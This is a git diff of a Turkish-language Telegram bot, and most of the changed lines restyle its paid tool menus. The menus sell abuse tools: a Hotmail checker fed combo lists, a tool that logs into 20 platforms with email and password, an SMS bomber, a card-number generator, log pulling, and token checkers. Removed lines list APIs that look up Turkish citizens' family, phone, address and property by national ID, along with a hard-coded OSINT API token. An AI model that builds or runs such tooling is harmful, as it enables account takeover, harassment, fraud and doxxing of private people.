@@ -24,7 +24,7 @@ import shutil
 import tempfile
 from pathlib import Path
 from datetime import datetime
-from random import choice, randint
+from random import choice, randint, shuffle
 from string import ascii_lowercase
 from urllib.parse import quote, urljoin, urlparse
 from telebot.types import (
@@ -576,7 +576,7 @@ def set_verified(user_id, val=1):
 
 def captcha_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn("✅ Ben robot değilim", "captcha_verify", "success"))
+    mk.add(_btn("Ben robot değilim", "captcha_verify", "success", "check"))
     return mk
 
 def captcha_required_message():
@@ -1389,22 +1389,22 @@ def accid_kb(user_id):
     free_left = max(0, ACCID_FREE_LIMIT - accid_get_free_used(user_id))
     balance = accid_get_balance(user_id)
     if user_id == ADMIN_ID:
-        durum = "👑 Admin — Sınırsız Sorgu"
+        durum = "Admin — Sınırsız Sorgu"
     else:
-        durum = f"🆓 Free: {free_left}/{ACCID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
-    mk.add(_btn(f"📊 {durum}", "noop"))
-    mk.add(_btn("🔍 Sorgu Yap", "accid_search", "primary"))
-    mk.add(_btn("💎 Paket Satın Al", "accid_packages", "success"))
-    mk.add(_btn("📊 İstatistiklerim", "accid_my_stats", "primary"))
-    mk.add(_btn("◀️ Geri", "goto_tools", "danger"))
+        durum = f"Free: {free_left}/{ACCID_FREE_LIMIT}  |  Bakiye: {balance}"
+    mk.add(_btn(f"{durum}", "noop", None, "id"))
+    mk.add(_btn("Sorgu Yap", "accid_search", "primary", "search"))
+    mk.add(_btn("Paket Satın Al", "accid_packages", "success", "star"))
+    mk.add(_btn("İstatistiklerim", "accid_my_stats", "primary", "stats"))
+    mk.add(_btn("Geri", "goto_tools", "danger", "back"))
     return mk
 
 def accid_packages_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn(f"💎 {ACCID_PACKAGE_25} Sorgu — {ACCID_PRICE_25} ⭐", "accid_buy_25", "success"))
-    mk.add(_btn(f"💎 {ACCID_PACKAGE_45} Sorgu — {ACCID_PRICE_45} ⭐", "accid_buy_45", "primary"))
-    mk.add(_btn(f"💎 {ACCID_PACKAGE_95} Sorgu — {ACCID_PRICE_95} ⭐", "accid_buy_95", "danger"))
-    mk.add(_btn("◀️ Geri", "tool_tgid", "danger"))
+    mk.add(_btn(f"{ACCID_PACKAGE_25} Sorgu — {ACCID_PRICE_25} ⭐", "accid_buy_25", "success", "star"))
+    mk.add(_btn(f"{ACCID_PACKAGE_45} Sorgu — {ACCID_PRICE_45} ⭐", "accid_buy_45", "primary", "star"))
+    mk.add(_btn(f"{ACCID_PACKAGE_95} Sorgu — {ACCID_PRICE_95} ⭐", "accid_buy_95", "danger", "star"))
+    mk.add(_btn("Geri", "tool_tgid", "danger", "back"))
     return mk
 
 def tgid_init_user(user_id):
@@ -2546,19 +2546,22 @@ CAPTURE_HIT = 0; CAPTURE_BAD = 0; CAPTURE_PROCESSED = 0
 def capture_keyboard(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
     is_prem = is_premium(user_id)
-    mk.add(_sep("📸 PLATFORM SEÇİNİZ"))
-    if is_prem: mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all", "success"))
-    else: mk.add(_btn("📸 Tüm Platformlar 🔒 (Premium)", "noop"))
+    mk.add(_sep("PLATFORM SEÇİNİZ"))
+    if is_prem:
+        mk.add(_btn("Tüm Platformlar", "capture_all", "success", "image"))
+    else:
+        mk.add(_btn("Tüm Platformlar (Premium)", "noop", "danger", "proxy"))
     for i in range(1, 21, 2):
         if i + 1 <= 20:
-            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}", "primary"),
-                   _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}", "primary"))
+            mk.add(
+                _btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}", "primary", "image"),
+                _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}", "primary", "image"),
+            )
         else:
-            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}", "primary"))
+            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}", "primary", "image"))
     if not is_prem:
-        mk.add(_sep(f"📊 Kalan Hakkınız: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
-        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium", "success"))
-    mk.add(_btn("◀️ Geri", "goto_hotmail", "danger"))
+        mk.add(_btn("Premium Satın Al (400⭐)", "buy_premium", "success", "star"))
+    mk.add(_btn("Geri", "goto_hotmail", "danger", "back"))
     return mk
 
 def capture_get_token(email, password):
@@ -2866,19 +2869,79 @@ def main_kb(user_id):
     mk.add(*[KeyboardButton(b) for b in btns])
     return mk
 
-def _btn(txt, cd, style=None):
-    """style: primary=mavi, success=yesil, danger=kirmizi (Bot API 9.4+)"""
+# Premium custom emoji ID haritasi (https://zulut30.github.io/premium-telegram-emoji)
+# Not: icon_custom_emoji_id icin bot sahibi Premium veya Fragment username gerekir.
+EMOJI_IDS = {
+    "tools": "5988023995125993550",      # wrench
+    "turkey": "5778184941154078090",     # translate / world
+    "searchx": "5931415565955503486",    # bot AI
+    "search": "5874960879434338403",     # search
+    "internet": "5447410659077661506",   # globe animated
+    "dns": "5879585266426973039",        # internet bw
+    "proxy": "5296369303661067030",      # lock
+    "log": "5967456680940671207",        # archive
+    "sms": "5276032951342088188",        # explosion
+    "hotmail": "5967280668885913944",    # envelope
+    "ai": "5931415565955503486",         # bot AI
+    "image": "5843506780931363129",      # image
+    "video": "6005986106703613755",      # video
+    "music": "5891249688933305846",      # music
+    "phone": "5967591100532134862",      # phone
+    "id": "5886505193180239900",         # fingerprint
+    "card": "5927169041595634481",       # card
+    "star": "5267500801240092311",       # telegram star
+    "premium": "5438496463044752972",    # star
+    "profile": "5879770735999717115",    # profile
+    "home": "5875082500023258804",       # back
+    "back": "5877536313623711363",       # arrow left
+    "ban": "5260293700088511294",        # ban
+    "check": "5206607081334906820",      # checkmark
+    "warning": "5447644880824181073",    # warning
+    "stats": "5231200819986047254",      # stats
+    "fire": "5424972470023104089",       # fire
+    "download": "5386367538735104399",   # download
+    "settings": "5341715473882955310",   # settings
+    "link": "5271604874419647061",       # link
+    "key": "6005570495603282482",        # key
+    "medicine": "5933768993285345899",   # medicine
+    "game": "5438559620538842050",       # gta / game
+    "discord": "5019579577924584242",    # discord anim
+    "telegram": "5206208353751024833",   # telegram
+    "gift": "5278467510604160626",       # treasure
+    "plus": "5397916757333654639",       # plus
+    "trash": "5879896690210639947",      # trash
+    "refresh": "5375338737028841420",    # refresh
+    "calendar": "5413879192267805083",   # calendar
+    "people": "5942877472163892475",     # people
+    "announce": "5424818078833715060",   # announcement
+    "site": "5447410659077661506",       # internet
+    "exif": "5397782960512444700",       # pin
+    "python": "5258042115023188415",     # javascript as code proxy / use key
+    "captcha": "5206607081334906820",    # check
+    "bell": "5458603043203327669",
+    "pin": "5397782960512444700",
+    "dollar": "5409048419211682843",
+}
+
+def _btn(txt, cd, style=None, icon=None):
+    """style: primary|success|danger — icon: EMOJI_IDS key veya dogrudan emoji_id str"""
     b = InlineKeyboardButton(txt, callback_data=cd)
     if style in ("primary", "success", "danger", "blue", "green", "red"):
-        # alias
         style = {"blue": "primary", "green": "success", "red": "danger"}.get(style, style)
         try:
             b.style = style
         except Exception:
             pass
+    if icon:
+        eid = EMOJI_IDS.get(icon, icon) if not str(icon).isdigit() else str(icon)
+        if eid and str(eid).isdigit():
+            try:
+                b.icon_custom_emoji_id = str(eid)
+            except Exception:
+                pass
     return b
 
-# telebot eski surumlerde style JSON'a yazilmiyorsa ekle
+# telebot: style + icon_custom_emoji_id JSON'a yaz
 try:
     _ikb_to_dict_orig = InlineKeyboardButton.to_dict
     def _ikb_to_dict_styled(self):
@@ -2886,6 +2949,9 @@ try:
         st = getattr(self, "style", None)
         if st:
             d["style"] = st
+        ic = getattr(self, "icon_custom_emoji_id", None)
+        if ic:
+            d["icon_custom_emoji_id"] = str(ic)
         return d
     InlineKeyboardButton.to_dict = _ikb_to_dict_styled
 except Exception as e:
@@ -2899,47 +2965,33 @@ def hotmail_keyboard(user_id):
     limit_text = get_keyword_limit_text(user_id)
     is_prem = is_premium(user_id)
     mk.add(_sep("📧 HOTMAIL CHECKER"))
-    if is_prem: mk.add(_btn("🚀 Hotmail Tarama Başlat ⭐", "hotmail_start", "success"))
-    else: mk.add(_btn("📧 Hotmail Tarama Başlat (3000 satır)", "hotmail_start", "primary"))
-    mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))
-    for kw in keywords[:10]: mk.add(_btn(f"📌 {kw}", "noop"))
-    mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw", "success"))
-    mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw", "danger"))
-    mk.add(_btn("🔄 Keywordleri Sıfırla", "hotmail_resetkw", "danger"))
-    mk.add(_sep("📸 CAPTURE TOOL"))
-    if is_prem: mk.add(_btn("📸 Capture Tarama Başlat ⭐", "capture_menu", "success"))
+    if is_prem:
+        mk.add(_btn("Hotmail Tarama Başlat", "hotmail_start", "success", "hotmail"))
+    else:
+        mk.add(_btn("Hotmail Tarama (3000 satır)", "hotmail_start", "primary", "hotmail"))
+    mk.add(_sep(f"KEYWORDLER ({len(keywords)}/{limit_text})"))
+    for kw in keywords[:10]:
+        mk.add(_btn(f"{kw}", "noop", None, "pin" if False else "search"))
+    mk.add(_btn("Keyword Ekle", "hotmail_addkw", "success", "plus"))
+    mk.add(_btn("Keyword Sil", "hotmail_delkw", "danger", "trash"))
+    mk.add(_btn("Keywordleri Sıfırla", "hotmail_resetkw", "danger", "refresh"))
+    mk.add(_sep("CAPTURE TOOL"))
+    if is_prem:
+        mk.add(_btn("Capture Tarama Başlat", "capture_menu", "success", "image"))
     else:
         capture_left = get_capture_limit_text(user_id)
-        mk.add(_btn(f"📸 Capture Tool ({capture_left} kullanım)", "capture_menu"))
-    if is_prem: mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
-    else: mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium", "success"))
-    mk.add(_btn(s(user_id, "back_btn"), "goto_tools", "danger"))
+        mk.add(_btn(f"Capture Tool ({capture_left})", "capture_menu", "primary", "image"))
+    if is_prem:
+        mk.add(_btn("Premium Aktif", "noop", None, "star"))
+    else:
+        mk.add(_btn("Premium Satın Al (400⭐)", "buy_premium", "success", "star"))
+    mk.add(_btn(s(user_id, "back_btn"), "goto_tools", "danger", "back"))
     return mk
 
-API_LIST = [
-    {"name":"Wazely API","url":"https://wazely.vercel.app/api/trlog?site=","type":"wazely"},
-    {"name":"Solidar API","url":"https://solidarksystems.alwaysdata.net/log.php?url=","type":"solidar"},
-    {"name":"RootTurkey API","url":"https://rootturkey.xyz/log?url=","type":"rootturkey"},
-]
-YASAKLI = [".gov",".edu","cheatglobal","spin","bet"]
-
-TURKIYE_API = {
-    "tc":{"url":"https://ajaxsystems.fun/tc.php?tc={tc}","icon":"🆔","tr":"TC Sorgu","en":"TC Query","ar":"استعلام TC","params":["tc"]},
-    "tcpro":{"url":"https://ajaxsystems.fun/tcpro.php?tc={tc}","icon":"🔍","tr":"TC Pro Sorgu","en":"TC Pro Query","ar":"استعلام TC Pro","params":["tc"]},
-    "adsoyad":{"url":"https://ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}","icon":"👤","tr":"Ad Soyad","en":"Name Surname","ar":"استعلام الاسم","params":["ad","soyad"]},
-    "aile":{"url":"https://ajaxsystems.fun/aile.php?tc={tc}","icon":"👨‍👩‍👧","tr":"Aile Sorgu","en":"Family Query","ar":"استعلام العائلة","params":["tc"]},
-    "ailepro":{"url":"https://ajaxsystems.fun/ailepro.php?tc={tc}","icon":"👨‍👩‍👧‍👦","tr":"Aile Pro","en":"Family Pro","ar":"العائلة Pro","params":["tc"]},
-    "sulale":{"url":"https://ajaxsystems.fun/sulale.php?tc={tc}","icon":"🌳","tr":"Sülale Sorgu","en":"Lineage Query","ar":"استعلام النسب","params":["tc"]},
-    "tcgsm":{"url":"https://ajaxsystems.fun/tcgsm.php?tc={tc}&auth=fire","icon":"📱","tr":"TC → GSM","en":"TC to GSM","ar":"TC إلى GSM","params":["tc"]},
-    "gsmtc":{"url":"https://ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire","icon":"📞","tr":"GSM → TC","en":"GSM to TC","ar":"GSM إلى TC","params":["gsm"]},
-    "eokul":{"url":"https://ajaxsystems.fun/eokul.php?tc={tc}","icon":"🎓","tr":"E-Okul Sorgu","en":"E-School Query","ar":"استعلام المدرسة","params":["tc"]},
-    "tapu":{"url":"https://ajaxsystems.fun/tapu.php?tc={tc}","icon":"🏠","tr":"Tapu Sorgu","en":"Title Deed Query","ar":"استعلام الملكية","params":["tc"]},
-    "adaparsel":{"url":"https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}","icon":"🗺️","tr":"Ada Parsel","en":"Block Parcel","ar":"استعلام القطعة","params":["il","ilce"]},
-    "adres":{"url":"https://apiv2.ajaxsystems.fun/adres.php?tc={tc}","icon":"🏠","tr":"Adres Sorgu (Tapu & Adres)","en":"Address Query","ar":"استعلام العنوان","params":["tc"]},
-}
-
-LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
-LS_BASE = "https://api.leaksights.com/osint"
+# LeakSights (opsiyonel — yoksa OSINT menusu bos kalir, bot crash olmaz)
+import os as _os_ls
+LS_BASE = _os_ls.environ.get("LS_BASE", "https://api.leaksights.com").rstrip("/")
+LS_TOKEN = _os_ls.environ.get("LS_TOKEN", "")
 
 def _lsurl(endpoint):
     return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"
@@ -3194,160 +3246,61 @@ def lmnx_can_use(user_id, key):
 
 def searchx_admin_give_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn("📅 1 Günlük", "adm_sx_pkg_1", "primary"))
-    mk.add(_btn("📆 1 Haftalık", "adm_sx_pkg_7", "success"))
-    mk.add(_btn("🗓 1 Aylık", "adm_sx_pkg_30", "primary"))
-    mk.add(_btn("♾️ Ömür boyu", "adm_sx_pkg_0", "danger"))
-    mk.add(_btn("◀️ Kapat", "noop"))
+    mk.add(_btn("1 Günlük", "adm_sx_pkg_1", "primary", "calendar"))
+    mk.add(_btn("1 Haftalık", "adm_sx_pkg_7", "success", "calendar"))
+    mk.add(_btn("1 Aylık", "adm_sx_pkg_30", "primary", "calendar"))
+    mk.add(_btn("Ömür boyu", "adm_sx_pkg_0", "danger", "star"))
+    mk.add(_btn("Kapat", "noop", "danger", "back"))
     return mk
 
 def searchx_packages_kb():
     mk = InlineKeyboardMarkup(row_width=1)
-    mk.add(_btn(f"📅 1 Günlük — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary"))
-    mk.add(_btn(f"📆 1 Haftalık — {SEARCHX_PRICE_WEEK}⭐", "buy_sx_week", "success"))
-    mk.add(_btn(f"🗓 1 Aylık — {SEARCHX_PRICE_MONTH}⭐", "buy_sx_month", "primary"))
-    mk.add(_btn("♾️ Ömür Boyu — @hackledin", "buy_sx_life", "danger"))
-    mk.add(_btn("📋 İçerik neler?", "lmnx_info", "primary"))
-    mk.add(_btn("◀️ SearchX 😈", "menu_lmnx", "danger"))
+    mk.add(_btn(f"1 Günlük — {SEARCHX_PRICE_DAY}⭐", "buy_sx_day", "primary", "calendar"))
+    mk.add(_btn(f"1 Haftalık — {SEARCHX_PRICE_WEEK}⭐", "buy_sx_week", "success", "calendar"))
+    mk.add(_btn(f"1 Aylık — {SEARCHX_PRICE_MONTH}⭐", "buy_sx_month", "primary", "calendar"))
+    mk.add(_btn("Ömür Boyu — @hackledin", "buy_sx_life", "danger", "star"))
+    mk.add(_btn("İçerik neler?", "lmnx_info", "primary", "search"))
+    mk.add(_btn("SearchX", "menu_lmnx", "danger", "searchx"))
     return mk
 
 def lmnx_main_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
     if user_id == ADMIN_ID or is_premium_lmnx(user_id):
-        mk.add(_btn("⭐ SearchX Premium Aktif", "noop"))
+        mk.add(_btn("SearchX Premium Aktif", "noop", None, "star"))
     else:
-        mk.add(_btn("💎 SearchX Premium Al", "buy_lmnx", "success"))
-    mk.add(_btn("📋 Premium içeriği neler?", "lmnx_info", "primary"))
-    mk.add(_btn("🎁 Davet et — Kazan", "ref_panel_sx", "success"))
+        mk.add(_btn("SearchX Premium Al", "buy_lmnx", "success", "star"))
+    mk.add(_btn("Premium içeriği neler?", "lmnx_info", "primary", "info_bw" if False else "search"))
+    mk.add(_btn("Davet et — Kazan", "ref_panel_sx", "success", "gift"))
     for cat, (title, keys) in LMNX_CATS.items():
         tag = "" if (user_id == ADMIN_ID or is_premium_lmnx(user_id)) else " 🔒"
-        mk.add(_btn(f"{title}{tag}", f"lmnx_cat_{cat}", "primary"))
-    mk.add(_btn("◀️ Geri", "goto_tools", "danger"))
+        # kategori ikonlari
+        cat_icon = {
+            "ai": "ai", "network": "internet", "crypto": "key",
+            "intel": "search", "card": "card", "mail": "hotmail",
+        }.get(cat, "searchx")
+        mk.add(_btn(f"{title}{tag}", f"lmnx_cat_{cat}", "primary", cat_icon))
+    mk.add(_btn("Geri", "goto_tools", "danger", "back"))
     return mk
-
 
 def lmnx_cat_kb(user_id, cat):
     mk = InlineKeyboardMarkup(row_width=1)
     title, keys = LMNX_CATS.get(cat, ("", []))
-    emoji_map = {
-        "lmnx_hackergpt": "💀", "lmnx_3dlogo": "🎨", "lmnx_aivideo": "🎬",
-        "lmnx_sub": "🛰️", "lmnx_dns": "🧭", "lmnx_ping": "📶", "lmnx_http": "🌍",
-        "lmnx_link": "🔗", "lmnx_whois": "📜", "lmnx_ssl": "🔒", "lmnx_reverse": "🔄",
-        "lmnx_port": "🔌", "lmnx_b64e": "🔐", "lmnx_b64d": "🔓", "lmnx_md5": "🔑",
-        "lmnx_sha256": "🔑", "lmnx_tgch": "📢", "lmnx_truecaller": "📞",
-        "lmnx_bin": "💳", "lmnx_ccgen": "💳", "lmnx_imei": "📱", "lmnx_darkweb": "🌑",
-        "lmnx_mailc": "✉️", "lmnx_mailk": "📬",
+    tool_icons = {
+        "lmnx_hackergpt": "ai", "lmnx_3dlogo": "image", "lmnx_aivideo": "video",
+        "lmnx_sub": "internet", "lmnx_dns": "dns", "lmnx_ping": "internet",
+        "lmnx_http": "link", "lmnx_link": "link", "lmnx_whois": "search",
+        "lmnx_ssl": "proxy", "lmnx_reverse": "refresh", "lmnx_port": "settings",
+        "lmnx_b64e": "key", "lmnx_b64d": "key", "lmnx_md5": "key", "lmnx_sha256": "key",
+        "lmnx_tgch": "telegram", "lmnx_truecaller": "phone", "lmnx_bin": "card",
+        "lmnx_ccgen": "card", "lmnx_imei": "phone", "lmnx_darkweb": "proxy",
+        "lmnx_mailc": "hotmail", "lmnx_mailk": "hotmail",
     }
     for k in keys:
         url, name, prompt, c, free = LMNX_APIS[k]
-        em = emoji_map.get(k, "▪️")
-        tag = ""
-        mk.add(_btn(f"{em} {name}{tag}", f"lmnx_tool_{k}", "primary"))
-    mk.add(_btn("◀️ SearchX 😈", "menu_lmnx", "danger"))
+        icon = tool_icons.get(k, "searchx")
+        mk.add(_btn(name, f"lmnx_tool_{k}", "primary", icon))
+    mk.add(_btn("SearchX", "menu_lmnx", "danger", "searchx"))
     return mk
-
-
-
-TOOLS_API = {
-    "bedrock":"https://wazelyapi.vercel.app/api/bedrock?adres=",
-    "ccgen":"https://wazelyapi.vercel.app/api/ccgen?bin=",
-    "dctoken":"https://wazelyapi.vercel.app/api/dcbottokencheck?token=",
-    "tgtoken":"https://wazelyapi.vercel.app/api/tgtokencheck?token=",
-    "eczane":"https://wazely.vercel.app/api/eczane?ad=",
-    "ipinfo":"https://wazely.vercel.app/api/ipinfo?ip=",
-    "dns":"https://wazely.vercel.app/api/dns?domain=",
-    "bahis":"https://wazely.vercel.app/api/bahis?isimsoyisim=",
-    "plaka":"https://wazely.vercel.app/api/plaka?plate=",
-    "predunyam":"https://wazely.vercel.app/api/predunyam",
-}
-
-TOOL_PROMPTS = {
-    "tr": {
-        "bedrock":"🎮 IP:PORT girin (Örn: bee.mc-complex.com:19132)",
-        "ccgen":"💳 BIN girin (Örn: 450000)",
-        "dctoken":"🤖 Discord Bot Token girin:",
-        "tgtoken":"✈️ Telegram Bot Token girin:",
-        "eczane":"💊 Eczane adını girin:",
-        "ipinfo":"🌐 IP Adresini girin:",
-        "dns":"🔎 Domain girin (Örn: google.com):",
-        "bahis":"⚽ İsim Soyisim girin:",
-        "plaka":"🚗 Plaka girin (Örn: 34ABC123):",
-        "proxycheck":"🛡️ IP adresini girin (Örn: 8.8.8.8):",
-        "urlscan":"🔍 Domain girin (Örn: google.com):",
-        "addbot":"🤖 Bot Token'ını girin:\nÖrnek: 8369544888:ABC123...",
-        "php2py":"🐍 PHP dosyası gönder, Python'a çevireyim.",
-        "smsbomb":"💣 SMS Bomber\n📱 Hedef numarayı girin:",
-        "hotmail":"📧 Hotmail Checker\nLütfen combo dosyasını gönderin.",
-        "exif":"📸 EXIF Metadata Analizi\nLütfen bir fotoğraf gönderin.",
-        "music":"🎵 Müzik İndirici\nŞarkı adı veya YouTube linki girin."
-    },
-    "en": {
-        "bedrock":"🎮 Enter IP:PORT", "ccgen":"💳 Enter BIN",
-        "dctoken":"🤖 Enter Discord Bot Token:", "tgtoken":"✈️ Enter Telegram Bot Token:",
-        "eczane":"💊 Enter pharmacy name:", "ipinfo":"🌐 Enter IP address:",
-        "dns":"🔎 Enter domain:", "bahis":"⚽ Enter full name:",
-        "plaka":"🚗 Enter plate:", "proxycheck":"🛡️ Enter IP:",
-        "urlscan":"🔍 Enter domain:", "addbot":"🤖 Enter Bot Token:",
-        "php2py":"🐍 Send PHP file.", "smsbomb":"💣 SMS Bomber",
-        "hotmail":"📧 Hotmail Checker", "exif":"📸 EXIF Analysis",
-        "music":"🎵 Music Downloader"
-    },
-    "ar": {
-        "bedrock":"🎮 أدخل IP:PORT","ccgen":"💳 أدخل BIN",
-        "dctoken":"🤖 أدخل Discord Bot Token:","tgtoken":"✈️ أدخل Telegram Bot Token:",
-        "eczane":"💊 أدخل اسم الصيدلية:","ipinfo":"🌐 أدخل عنوان IP:",
-        "dns":"🔎 أدخل النطاق:","bahis":"⚽ أدخل الاسم:",
-        "plaka":"🚗 أدخل رقم اللوحة:","proxycheck":"🛡️ أدخل IP:",
-        "urlscan":"🔍 أدخل النطاق:","addbot":"🤖 أدخل توكن البوت:",
-        "php2py":"🐍 أرسل ملف PHP.","smsbomb":"💣 قنبلة SMS",
-        "hotmail":"📧 Hotmail Checker","exif":"📸 تحليل EXIF",
-        "music":"🎵 تحميل الموسيقى"
-    },
-}
-
-TURKEY_PROMPTS = {
-    "tr": {
-        "tc":"🆔 TC Kimlik Numarası girin (11 haneli):",
-        "tcpro":"🔍 TC Kimlik Numarası girin (11 haneli):",
-        "adsoyad":"👤 Ad Soyad girin (Örn: Ali Yılmaz | Ali Veli Yılmaz):",
-        "aile":"👨‍👩‍👧 TC Kimlik Numarası girin (11 haneli):",
-        "ailepro":"👨‍👩‍👧‍👦 TC Kimlik Numarası girin (11 haneli):",
-        "sulale":"🌳 TC Kimlik Numarası girin (11 haneli):",
-        "tcgsm":"📱 TC Kimlik Numarası girin (11 haneli):",
-        "gsmtc":"📞 GSM numarası girin (Örn: 5306524123):",
-        "eokul":"🎓 TC Kimlik Numarası girin (11 haneli):",
-        "tapu":"🏠 TC Kimlik Numarası girin (11 haneli):",
-        "adaparsel":"🗺️ İl,İlçe girin (Örn: İSTANBUL,KADIKÖY):",
-        "adres":"🏠 Adres Sorgu\nTC Kimlik Numarası girin (11 haneli):",
-    },
-    "en": {
-        "tc":"🆔 Enter TC ID (11 digits):","tcpro":"🔍 Enter TC ID:",
-        "adsoyad":"👤 Enter name surname:","aile":"👨‍👩‍👧 Enter TC ID:",
-        "ailepro":"👨‍👩‍👧‍👦 Enter TC ID:","sulale":"🌳 Enter TC ID:",
-        "tcgsm":"📱 Enter TC ID:","gsmtc":"📞 Enter GSM:",
-        "eokul":"🎓 Enter TC ID:","tapu":"🏠 Enter TC ID:",
-        "adaparsel":"🗺️ Enter Province,District:","adres":"🏠 Address Query\nEnter TC ID:",
-    },
-    "ar": {
-        "tc":"🆔 أدخل رقم الهوية:","tcpro":"🔍 أدخل رقم الهوية:",
-        "adsoyad":"👤 أدخل الاسم واللقب:","aile":"👨‍👩‍👧 أدخل رقم الهوية:",
-        "ailepro":"👨‍👩‍👧‍👦 أدخل رقم الهوية:","sulale":"🌳 أدخل رقم الهوية:",
-        "tcgsm":"📱 أدخل رقم الهوية:","gsmtc":"📞 أدخل رقم GSM:",
-        "eokul":"🎓 أدخل رقم الهوية:","tapu":"🏠 أدخل رقم الهوية:",
-        "adaparsel":"🗺️ أدخل المحافظة,المنطقة:","adres":"🏠 استعلام العنوان:",
-    },
-}
-
-
-# ══════════════════════════════════════════════════════════════
-#  🌐 SITE COPY (mirror)
-# ══════════════════════════════════════════════════════════════
-try:
-    from bs4 import BeautifulSoup
-    _BS4_OK = True
-except Exception:
-    _BS4_OK = False
-
 
 def _sitecopy_norm_domain(domain):
     domain = (domain or "").strip()
@@ -3604,52 +3557,68 @@ def _process_sitecopy(msg, bot_instance):
 
 
 def tools_kb(user_id):
+    """
+    Renk duzeni:
+      success (yesil) = ana kategoriler / medya / guvenli
+      primary (mavi)  = bilgi / network / arama
+      danger  (kirmizi) = hassas / checker / bomber / log
+    """
     mk = InlineKeyboardMarkup(row_width=2)
-    # primary=mavi  success=yesil  danger=kirmizi  (Bot API 9.4+)
+    # --- Ana kategoriler (yesil + mavi) ---
     mk.add(
-        _btn("🇹🇷 Türkiye Sorguları", "menu_turkey", "success"),
-        _btn("SearchX 😈", "menu_lmnx", "primary"),
+        _btn("Türkiye Sorguları", "menu_turkey", "success", "turkey"),
+        _btn("SearchX", "menu_lmnx", "primary", "searchx"),
     )
+    # --- Bilgi sorgulari (mavi) ---
     mk.add(
-        _btn("🎮 MC Bedrock", "tool_bedrock", "success"),
-        _btn("💳 CC Gen (SearchX)", "menu_lmnx", "danger"),
-        _btn("🤖 Discord Token", "tool_dctoken", "danger"),
-        _btn("✈️ TG Token", "tool_tgtoken", "danger"),
-        _btn("💊 Eczane", "tool_eczane", "success"),
-        _btn("🌐 IP Bilgi", "tool_ipinfo", "primary"),
-        _btn("🔎 DNS Sorgu", "tool_dns", "primary"),
-        _btn("⚽ Bahis Sorgu", "tool_bahis", "success"),
-        _btn("🚗 Plaka Sorgu", "tool_plaka", "success"),
-        _btn("💎 PreDunyam", "tool_predunyam", "primary"),
-        _btn("🛡️ Proxy Check", "tool_proxycheck", "danger"),
-        _btn("🔍 URL Scan", "tool_urlscan", "danger"),
-        _btn("🎥 Video İndir", "tool_video", "success"),
-        _btn("🎵 Müzik İndir", "tool_music", "success"),
-        _btn("🤖 Bot Ekle", "tool_addbot", "primary"),
-        _btn("🐍 PHP→Python", "tool_php2py", "primary"),
-        _btn("💣 SMS Bomber", "tool_smsbomb", "danger"),
-        _btn("📧 Hotmail Checker", "tool_hotmail", "danger"),
-        _btn("📸 EXIF Metadata", "tool_exif", "primary"),
-        _btn("🆔 Telegram ID Sorgu", "tool_tgid", "primary"),
-        _btn("🎨 AI Image Generator", "tool_aiimg", "success"),
-        _btn("📂 Log Çekme", "tool_log", "danger"),
-        _btn("🌐 Site Copy", "tool_sitecopy", "primary"),
+        _btn("IP Bilgi", "tool_ipinfo", "primary", "internet"),
+        _btn("DNS Sorgu", "tool_dns", "primary", "dns"),
+        _btn("Plaka Sorgu", "tool_plaka", "primary", "search"),
+        _btn("Bahis Sorgu", "tool_bahis", "primary", "stats"),
+        _btn("Eczane", "tool_eczane", "primary", "medicine"),
+        _btn("PreDunyam", "tool_predunyam", "primary", "star"),
+        _btn("Telegram ID", "tool_tgid", "primary", "id"),
+        _btn("EXIF Metadata", "tool_exif", "primary", "exif"),
     )
-    mk.add(_btn(s(user_id, "home_btn"), "goto_home", "success"))
+    # --- Network / tarama (mavi) ---
+    mk.add(
+        _btn("Proxy Check", "tool_proxycheck", "primary", "proxy"),
+        _btn("URL Scan", "tool_urlscan", "primary", "link"),
+        _btn("Site Copy", "tool_sitecopy", "primary", "site"),
+        _btn("MC Bedrock", "tool_bedrock", "primary", "game"),
+    )
+    # --- Medya (yesil) ---
+    mk.add(
+        _btn("Video İndir", "tool_video", "success", "video"),
+        _btn("Müzik İndir", "tool_music", "success", "music"),
+        _btn("AI Image", "tool_aiimg", "success", "image"),
+        _btn("Bot Ekle", "tool_addbot", "success", "ai"),
+    )
+    # --- Hassas / checker (kirmizi) ---
+    mk.add(
+        _btn("SMS Bomber", "tool_smsbomb", "danger", "sms"),
+        _btn("Hotmail Checker", "tool_hotmail", "danger", "hotmail"),
+        _btn("Log Çekme", "tool_log", "danger", "log"),
+        _btn("CC Gen (SearchX)", "menu_lmnx", "danger", "card"),
+        _btn("Discord Token", "tool_dctoken", "danger", "discord"),
+        _btn("TG Token", "tool_tgtoken", "danger", "telegram"),
+        _btn("PHP→Python", "tool_php2py", "danger", "key"),
+    )
+    mk.add(_btn("Ana Menü", "goto_home", "success", "home"))
     return mk
 
 def log_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
     durum = get_log_limit_text(user_id)
     if is_premium_log(user_id) or user_id == ADMIN_ID:
-        mk.add(_btn(f"⭐ LOG Premium Aktif — {durum}", "noop"))
